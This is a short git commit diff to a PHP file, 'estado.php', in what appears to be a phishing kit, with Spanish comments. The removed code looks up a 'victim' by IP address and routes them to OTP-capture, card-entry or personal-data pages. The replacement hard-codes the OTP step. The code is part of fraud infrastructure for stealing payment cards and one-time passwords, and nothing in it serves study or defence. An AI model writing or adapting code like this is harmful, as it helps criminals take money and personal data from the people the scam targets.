b17901f074ab6e3a7027a966dfa9e94622d104ca
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-21 20:17:59 -0500

    Actualizar estado.php

--- process/estado.php
+++ process/estado.php
@@ -1,20 +1,3 @@
 <?php
-require('../panel/lib/funciones.php');
-$ip = $_SERVER['REMOTE_ADDR'];
-
-// Esta función debe devolver qué paso sigue
-$estado = consultar_estado_victima($ip); 
-
-if ($estado == "OTP") { 
-    echo "2"; // 2 es el caso para OTP en functions.js
-} 
-elseif ($estado == "TARJETA") { 
-    echo "6"; // 6 es el caso para PRODUCT.php (Tarjeta) en functions.js
-}
-elseif ($estado == "INFO") { 
-    echo "4"; // 4 es para pedir datos personales
-}
-else { 
-    echo "0"; // Sigue esperando
-}
+echo "2";
 ?>
